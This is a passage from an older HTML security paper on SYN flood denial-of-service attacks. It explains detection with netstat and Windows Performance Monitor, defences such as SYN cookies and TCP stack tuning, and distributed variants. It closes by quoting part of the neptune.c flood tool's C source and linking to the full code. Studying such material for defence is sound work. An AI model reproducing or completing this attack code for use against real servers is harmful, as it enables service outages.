multiple instances of <B style="color:black;background-color:#99ff99">neptune</B>.c with different <B style="color:black;background-color:#ff9999">source</B> addresses. Newer 
exploits, as previously mentioned, automatically give as attacker a 
randomized <B style="color:black;background-color:#ff9999">source</B> address without doing additional scripting.</font>&nbsp;<br />
</p>
<h2><font size="3" face="Arial">Signature of the attack</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">To 
a network monitoring system, a <B style="color:black;background-color:#A0FFFF">SYN</B> Flood attack seems as though it is 
normal TCP activity. There are systems designed to monitor network traffic 
looking for attacks by comparing certain packet signatures against the 
passing data stream. These are known as Intrusion Detection Systems 
(IDS). Unless the same <B style="color:black;background-color:#ff9999">source</B> address is used in every packet, Intrusion 
Detection Systems generally cannot provide adequate warning of an ongoing 
attack. Snort, for instance, only sees the attack as a port scan, which 
is so common as to be ignored by most filters. Normal detection of an 
attack usually consists of users experiencing slow response time or 
an unavailable service. When this is noticed, further research can uncover 
the true cause.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Available 
on UNIX, Linux, Windows and other operating systems running a TCP stack, 
the netstat command can show the current connection state of the TCP 
protocol on a host. By running netstat 
an on a host that is suspected of being under attack, we can see a 
large number of connections in the <B style="color:black;background-color:#A0FFFF">SYN</B>-RCVD state:</font>&nbsp;<br />
</p>
<p><font size="3" face="Arial"># netstat -an</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">UDP</font></p>
<p><font size="3" face="Arial">&nbsp;&nbsp; Local Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Remote Address&nbsp;&nbsp;&nbsp;&nbsp; State</font></p>
<p><font size="3" face="Arial">-------------------- &nbsp;--------------------&nbsp; 
-------</font></p>
<p><font size="3" face="Arial">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *&nbsp;&nbsp;&nbsp;514&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Idle</font></p>
<p><font size="3" face="Arial">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *.*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Unbound</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">TCP</font></p>
<p><font size="3" face="Arial">Local Address&nbsp;Remote Address&nbsp;Swind&nbsp;Send-Q&nbsp;Rwind&nbsp;Recv-Q&nbsp;State</font></p>
<p><font size="3" face="Arial">*.* &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0&nbsp;&nbsp;0&nbsp;0&nbsp;IDLE</font></p>
<p><font size="3" face="Arial">*.21&nbsp;&nbsp;&nbsp;*.*&nbsp;&nbsp;&nbsp;0&nbsp;0&nbsp;&nbsp;0&nbsp;0&nbsp;LISTEN</font></p>
<p><font size="3" face="Arial">*.23&nbsp;&nbsp;&nbsp;*.*&nbsp;&nbsp;&nbsp;0&nbsp;0&nbsp;&nbsp;0&nbsp;0&nbsp;LISTEN</font></p>
<p><font size="3" face="Arial">*.80&nbsp;&nbsp;&nbsp;*.*&nbsp;&nbsp;&nbsp;0&nbsp;0&nbsp;&nbsp;0&nbsp;0&nbsp;LISTEN</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.62726&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.62982&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.63238&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.63494&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.63750&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.64006&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.64262&nbsp;0&nbsp;0 &nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.64518&nbsp;0&nbsp;0&nbsp; 
&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.64774&nbsp;0&nbsp;0 &nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.65030&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.65286&nbsp;0&nbsp;0&nbsp; 
&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.7&nbsp;&nbsp;0&nbsp;0&nbsp; &nbsp;&nbsp;9112&nbsp;0 
&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.263&nbsp;&nbsp;0&nbsp;0 &nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.519&nbsp;&nbsp;0&nbsp;0&nbsp; &nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.775&nbsp;&nbsp;0&nbsp;0&nbsp; &nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.1031&nbsp;0&nbsp;0&nbsp; 
&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.1287&nbsp;0&nbsp;0&nbsp; 
&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.1543&nbsp;0&nbsp;0&nbsp; 
&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.1799&nbsp;0&nbsp;0&nbsp; 
&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial">192.168.0.15.80&nbsp;10.3.3.3.2055&nbsp;0&nbsp;0&nbsp;&nbsp;9112&nbsp;0&nbsp;SYN_RCVD</font></p>
<p><font size="3" face="Arial"> *.*&nbsp;&nbsp;&nbsp;*.*&nbsp;&nbsp;&nbsp;0&nbsp;0&nbsp; &nbsp;&nbsp;0&nbsp;0&nbsp;IDLE</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Another 
method of detecting a <B style="color:black;background-color:#A0FFFF">SYN</B> Flood attack on the Windows NT and Windows 
2000 platforms is using the Performance Monitor.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
Windows Performance Monitor has the ability to graph system activity 
in real time, as well as logging activity and generating alerts based 
upon user-defined parameters. Using the graphical interface, system 
components, such as parts of the TCP/IP stack, can be selected for monitoring.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
most important system component that should be monitored for <B style="color:black;background-color:#A0FFFF">SYN</B> Flood 
attacks is TCP. The system object TCP:Connection Failures indicates 
how many times TCP connections have either transitioned to a CLOSED 
state from a <B style="color:black;background-color:#A0FFFF">SYN</B>-SENT or <B style="color:black;background-color:#A0FFFF">SYN</B>-RECEIVED state, or have transitioned to 
a LISTEN state directly from a <B style="color:black;background-color:#A0FFFF">SYN</B>-RECEIVED state.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Two 
other counters that should be monitored are TCP:Connections Passive, 
which represents the number of times connections have switched directly 
from the LISTEN state to the <B style="color:black;background-color:#A0FFFF">SYN</B>-RECEIVED state, and TCP:Connections 
Reset, which represents the number of times connections have switched 
to the CLOSED state directly from either the ESTABLISHED state or the 
CLOSE-WAIT state. Both of these counters will continue to rise through 
normal activity, but a sudden increase in these counters could indicate 
trouble and certainly should trigger further investigation.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Regular 
use of the logging feature of Performance Monitor will allow for the 
accumulation of normal data to be used as a baseline. Analysis of this 
baseline should allow for the determination of a threshold, above which 
an attack is likely to be occurring.</font></p>
<h2><font size="3" face="Arial">How to protect against it</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">There 
is no foolproof way to defend against <B style="color:black;background-color:#A0FFFF">SYN</B> Flood attacks when using the 
current version of the TCP/IP protocol (IPv4). IP version 6 (IPv6) contains 
newer security features that may be implemented to prevent such attacks, 
but widespread adoption of that standard has not yet occurred. The best 
that can be hoped for is to minimize the effect of this type of Denial 
of Service attack. The solutions vary in implementation and effectiveness 
depending upon the TCP stack in use. Some solutions are:</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial"><B style="color:black;background-color:#A0FFFF">SYN</B> 
Cookies:&nbsp; <B style="color:black;background-color:#A0FFFF">SYN</B> cookies were first implemented in the Linux 2.0.30 
kernel. A host, upon receiving a <B style="color:black;background-color:#A0FFFF">SYN</B> packet, will determine if the backlog 
table is almost full. When the backlog table is close to being full, 
this host will reply with a <B style="color:black;background-color:#A0FFFF">SYN</B> cookie, which is different from a normal 
<B style="color:black;background-color:#A0FFFF">SYN</B>-ACK in a number of ways. Information about the received <B style="color:black;background-color:#A0FFFF">SYN</B>, known 
as a <B style="color:black;background-color:#A0FFFF">SYN</B> Cookie, is sent back to the host requesting the connection 
as part of the sequence number. Typically, this cookie is taken from 
the clients Initial Sequence Number (ISN) and modified with an algorithm 
known only to the server. The reply packet also contains the ACK flag.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial"> 
Because the <B style="color:black;background-color:#A0FFFF">SYN</B> Cookie is used, no entry for the partial connection 
is placed in the backlog table. The initiating host then sends the ACK 
back to the target host.&nbsp; The host will analyze the ACK along with 
the sequence number (the cookie), analyzing the sequence number using 
its secret algorithm and, if correct, a connection is made. If it is 
incorrect, the target host will determine that this ACK packet is not 
part of an existing connection establishment session. Because no entry 
is made in the backlog table, the system resources used by the table 
cannot be exhausted.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Faster 
timeout of entries in the backlog table:&nbsp; New settings to implement 
faster timeouts of entries in the backlog table are available to Windows 
NT and Windows 2000 systems with the latest service packs applied. By 
reducing the timeout of half-open connections, Windows systems can withstand 
a <B style="color:black;background-color:#A0FFFF">SYN</B> Flood for greater lengths of time. </font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
primary setting available was introduced in Service Pack 5 for Windows 
NT 4.0 and has been present in each version since. The registry value 
SynAttackProtect, found under HKEY_LOCAL_MACHINE in the key \System\CurrentControlSet\Services\Tcpip\Parameters 
can be changed from the default of 0 (no protection) to either 1, which 
reduces the restransmission of <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK retries, or 2, which reduces 
the retransmission of <B style="color:black;background-color:#A0FFFF">SYN</B>-ACK retries and only commits resources to 
the connection once the three-way handshake has completed. These resources 
are route cache entries and are managed by the afd.sys driver.&nbsp; 
The recommendation is to change this value to 2.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
SynAttackProtect feature is only triggered when the settings for TcpMaxHalfOpen 
and TcpMaxHalfOpenRetries have been exceeded. These settings, therefore, 
should be adjusted as well.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
TcpMaxHalfOpen setting controls how many connections in the <B style="color:black;background-color:#A0FFFF">SYN</B>-RECEIVED 
state are allowed before SynAttackProtect is used. When running Windows 
2000 Advanced Server, the default is 500 and should be reduced, possibly 
as low as 200. The default for Windows 2000 Server is 100 and should 
not require lowering.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
TcpMaxHalfOpenRetries setting controls how many connections in the <B style="color:black;background-color:#A0FFFF">SYN</B>-RECEIVED 
state are allowed after at least one retransmission of the <B style="color:black;background-color:#A0FFFF">SYN</B> response. 
The default setting for Advanced Server is 400 and should be reduced 
to 150. The default setting for Server is 80 and should not be adjusted.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Microsoft 
article Q142641 contains details of other available settings regarding 
the control of the backlog table and retransmission of connection responses, 
while the whitepaper Windows 2000 TCP/IP Implementation Details, Q238643, 
contains a great deal of information regarding the functionality of 
the Windows 2000 TCP/IP stack.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Better 
management of queues: Available on Solaris 2.6 and above from Sun Microsystems. 
Also available as a patch to Solaris 2.5.1. The TCP stack uses two queues. 
The first queue handles incoming, non-established connections. The second 
queue handles all established connections. If the first queue becomes 
full due to an attack, or abnormally high levels of traffic, the oldest 
half-open connection will be removed from the queue, allowing the latest 
request to come into the queue.&nbsp; All connections which are successfully 
established are moved from the first queue to the second queue.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
size of these queues can be adjusted. Using the ndd utility to set kernel 
parameters, the settings:</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">tcp_conn_req_max_q0&nbsp; 
(the non-established, first queue) and</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">tcp_conn_req_max_q&nbsp;&nbsp; 
(the established connection, second queue)</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">can 
be checked and adjusted for your sites requirements.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">AIX, 
from IBM, uses a similar queueing mechanism. The parameter clean_partial_conns, 
if set to a non-zero number, specifies hom many randomly chosen half-open 
connections to remove from the non-established queue. This value is 
set by the no command. Also available to AIX is the somaxconn parameter 
which determines the size of the backlog table. The default is 1024 
bytes and can be adjusted on versions 4.1.5, 4.2 and later.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Load 
balancing:&nbsp; Numerous devices can be purchased that will direct 
traffic to multiple servers based on current load. By having numerous 
points of entry into an available service the Denial of Service attack 
must be directed at each of these entry points in order to succeed.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">One 
such solution is the Cisco MultiNode Load Balancing (MNLB). Utilizing 
software installed on Cisco routers and switches, the product Cisco 
LocalDirector and software on the application servers (such as Unix 
and Windows NT/2000), it is possible to setup a group of computers to 
respond to client requests. Connection routing decisions are based upon 
current server load, number of connections currently being serviced 
by each node and round-robin style connection redirection. More information 
is available at the Cisco web site: </font><a href="http://www.cisco.com/warp/public/cc/pd/ibsw/mulb/prodlit/mnlb_ov.htm"><font
 color="#0000FF" size="3" face="Arial">http://www.cisco.com/warp/public/cc/pd/ibsw/mulb/prodlit/mnlb_ov.htm</font></a>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Another 
solution, available with Windows NT 4.0 Enterprise Edition and Windows 
2000 Advanced Server, is the Windows Load Balancing Service (WLBS). 
Originally designed by Valence Research, Inc, which was acquired by 
Microsoft, this load balancing solution is included with the operating 
system. These servers utilize message passing between servers in a load 
balancing solution that indicates their current availability and workload. 
Because there are a greater number of high powered servers servicing 
client requests, it takes a much greater flood of <B style="color:black;background-color:#A0FFFF">SYN</B> packets to take 
down the entire system.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial"><B style="color:black;background-color:#A0FFFF">SYN</B> 
Flood detection at the border:&nbsp; There are modern routers and firewalls 
that will keep track of half open connections passing through them. 
With this information, these systems can throttle the number of connection 
requests allowed to a particular host. Unfortunately, these systems 
tend to be expensive. These systems require a great deal of intelligence 
built into them if they are to be successful. This form of analysis 
also requires a great deal of overhead, not typically found in a router, 
therefore requiring a much greater level of hardware  faster processors, 
more memory and wider I/O channels.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">A 
method for preventing the <B style="color:black;background-color:#ff9999">source</B> of Denial of Service attacks is documented 
in RFC 2267. Through the use of packet filter rules, network administrators 
and ISPs can help prevent their networks from being the <B style="color:black;background-color:#ff9999">source</B> of a 
Denial of Service attacks. By ensuring that any packet leaving the network 
comes from a legitimate address, packet filters can log or prevent many 
of the attacks and allow investigators to track the attempted attack 
and perhaps find the perpetrator.</font></p>
<h2><font size="3" face="Arial">Description of variants</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Although 
<B style="color:black;background-color:#99ff99">neptune</B>.c was one of the first <B style="color:black;background-color:#A0FFFF">SYN</B> Flood tools to come to light, clever 
programmers have made modern variants far more effective and dangerous. 
One of the limitations of <B style="color:black;background-color:#99ff99">neptune</B>.c is the amount of traffic that can 
be generated by a single attacker and the possibilities of these packets 
can be traced back to the actual attacker by reviewing router logs.</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Another 
weakness is <B style="color:black;background-color:#99ff99">neptune</B>.cs use of a single spoofed address. Modern systems 
designed to detect <B style="color:black;background-color:#A0FFFF">SYN</B> Floods would detect a large number of <B style="color:black;background-color:#A0FFFF">SYN</B> packets 
arriving from a single <B style="color:black;background-color:#ff9999">source</B>. These systems can decide to ignore future 
packets from this <B style="color:black;background-color:#ff9999">source</B>, preventing the <B style="color:black;background-color:#A0FFFF">SYN</B> Flood from succeeding.</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Tribal 
Flood Network, and its updated version TFN2K, as well as stacheldraht 
(German for barbed wire) are known as Distributed Denial of Service 
tools. These tools work using a master/slave design, where slave programs 
are placed on compromised hosts. These hosts can then be remotely commanded 
by the master to begin a <B style="color:black;background-color:#A0FFFF">SYN</B> Flood attack. Each of these slaves are 
capable of randomly generating addresses to be spoofed, making it near 
impossible for a target host to recognize the flood of packets as an 
attack.&nbsp; By using distributed atackers there is no one attack path 
in use that can be traced.&nbsp; The actual attacking hosts arent even 
owned by the true attacker, they are often the systems of unwitting 
home users.</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
National Infrastructure Protection Center has a tool designed to test 
Solaris and Linux systems for the presence of some of these tools.&nbsp; 
More information can be found at:&nbsp; </font><a href="http://www.nipc.gov/warnings/alerts/1999/trinoo.htm"><font
 color="#0000FF" size="3" face="Arial">http://www.nipc.gov/warnings/alerts/1999/trinoo.htm</font></a><font
 size="3" face="Arial">.</font></p>
<h2><font size="3" face="Arial"><B style="color:black;background-color:#ff9999">Source</B> code/ Pseudo code</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Although 
the entire code for <B style="color:black;background-color:#99ff99">Neptune</B>.c can be found at: </font><a href="http://www.fc.net/phrack/files/p48/p48-13.html"><font
 color="#0000FF" size="3" face="Arial">http://www.fc.net/phrack/files/p48/p48-13.html</font></a><font
 size="3" face="Arial">, the relevant parts of the <B style="color:black;background-color:#99ff99">neptune</B>.c code are 
as follows:</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">First 
is the function that handles the generation of the ICMP_ECHO packet. 
This is the piece of code that the program uses to ensure that the spoofed 
address is not a legitimate host.</font>&nbsp;<br /></p>
<p><font size="3" face="Courier New">int slickPing(amount,sock,dest)</font></p>
<p><font size="3" face="Courier New">int amount,sock;</font></p>
<p><font size="3" face="Courier New">char *dest;</font></p>
<p><font size="3" face="Courier New">{</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">int 
alarmHandler();</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">unsigned 
nameResolve(char *);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">register 
int retcode,j=0;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">struct 
icmphdr *icmp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">struct 
sockaddr_in sin;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">unsigned 
char sendICMPpak[MAXPAK]={0};</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">unsigned 
short pakID=getpid()&amp;0xffff;</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">struct 
ippkt{</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;&nbsp;struct iphdr ip;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;&nbsp;struct icmphdr icmp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;&nbsp;char buffer[MAXPAK];</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">}pkt;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">bzero((char 
*)&amp;sin,sizeof(sin));</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">sin.sin_family=AF_INET;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">sin.sin_addr.s_addr=nameResolve(dest);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">icmp=(struct 
icmphdr *)sendICMPpak;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">icmp-&gt;type=ICMP_ECHO;&nbsp;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">icmp-&gt;code=0;&nbsp;&nbsp;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">icmp-&gt;un.echo.id=pakID;&nbsp;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">icmp-&gt;un.echo.sequence=0;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">icmp-&gt;checksum=in_cksum((unsigned 
short *)icmp,64);</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">fprintf(stderr,&quot;sending 
ICMP_ECHO packets: &quot;);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">for(;j&lt;amount;j++){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">usleep(ICMPSLEEP);&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">retcode=sendto(sock,sendICMPpak,64,0,(struct 
sockaddr *)&amp;sin,sizeof(sin));</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(retcode&lt;0||retcode!=64)</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(retcode&lt;0){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">perror(&quot;ICMP sendto err&quot;);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">exit(1);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">}</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">else fprintf(stderr,&quot;Only wrote %d 
bytes&quot;,retcode);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">else fprintf(stderr,&quot;.&quot;);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">}</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">HANDLERCODE=1;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">signal(SIGALRM,alarmHandler);&nbsp;</font><font
 size="3" face="Arial">**On my system I had to comment this</font></p>
<ul><ul><ul><ul><ul><ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Arial">out, there seems to be an issue with the</font></p></ul></ul></ul></ul></ul></ul>
<ul><ul><ul><ul><ul><ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Arial">type of pointer this references 
</font></p></ul></ul></ul></ul></ul></ul>
<ul><ul><ul><ul><ul><ul><ul><p><font size="3" face="Arial">someone with 
a higher level of C</font></p></ul></ul></ul></ul></ul></ul></ul>
<ul><ul><ul><ul><ul><ul><ul><p><font size="3" face="Arial">programming 
skills could probably</font></p></ul></ul></ul></ul></ul></ul></ul>
<ul><ul><ul><ul><ul><ul><ul><p><font size="3" face="Arial">ascertain 
what has changed since 1996</font></p></ul></ul></ul></ul></ul></ul></ul>
